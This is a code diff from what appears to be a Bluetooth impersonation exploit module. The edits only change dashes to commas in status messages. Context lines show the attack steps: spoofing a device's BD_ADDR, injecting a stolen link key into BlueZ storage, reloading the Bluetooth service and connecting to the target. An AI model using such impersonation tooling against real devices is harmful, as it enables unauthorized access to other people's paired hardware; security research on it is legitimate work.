@@ -143,12 +143,12 @@ class Module(ExploitModule):
             if new_mac and new_mac.upper() == impersonate.upper():
                 self.print_success(f"BD_ADDR spoofed to {new_mac}")
             else:
-                self.print_warning(f"MAC shows as {new_mac} — spoofing may not be fully effective")
+                self.print_warning(f"MAC shows as {new_mac}, spoofing may not be fully effective")
 
             # Step 4: Inject link key into BlueZ storage
             self.print_status("Step 4: Injecting link key into BlueZ storage...")
             if not self._inject_link_key(impersonate, target, clean_key, key_type):
-                self.print_warning("Could not inject into BlueZ storage — continuing with raw connection")
+                self.print_warning("Could not inject into BlueZ storage, continuing with raw connection")
 
             # Step 5: Restart Bluetooth service to load new key
             self.print_status("Step 5: Reloading Bluetooth service...")
@@ -167,7 +167,7 @@ class Module(ExploitModule):
             elif service == "l2cap":
                 success = self._connect_l2cap(target)
             elif service == "none":
-                self.print_success("Impersonation configured — no service connection requested")
+                self.print_success("Impersonation configured, no service connection requested")
                 success = True
             else:
                 self.print_error(f"Unknown service: {service}")
@@ -300,7 +300,7 @@ class Module(ExploitModule):
             import bluetooth
             services = bluetooth.find_service(address=target)
             if services:
-                self.print_success(f"SDP query successful — {len(services)} services found")
+                self.print_success(f"SDP query successful, {len(services)} services found")
                 for svc in services[:5]:
                     self.print_status(f"  {svc.get('name', 'Unknown')}: "
                                     f"ch={svc.get('port', '?')} proto={svc.get('protocol', '?')}")
@@ -309,7 +309,7 @@ class Module(ExploitModule):
                 self.print_warning("SDP returned no services (connection may still work)")
                 return True
         except ImportError:
-            self.print_warning("pybluez not available for SDP — trying sdptool")
+            self.print_warning("pybluez not available for SDP, trying sdptool")
             try:
                 result = subprocess.run(
                     ["sdptool", "browse", target],
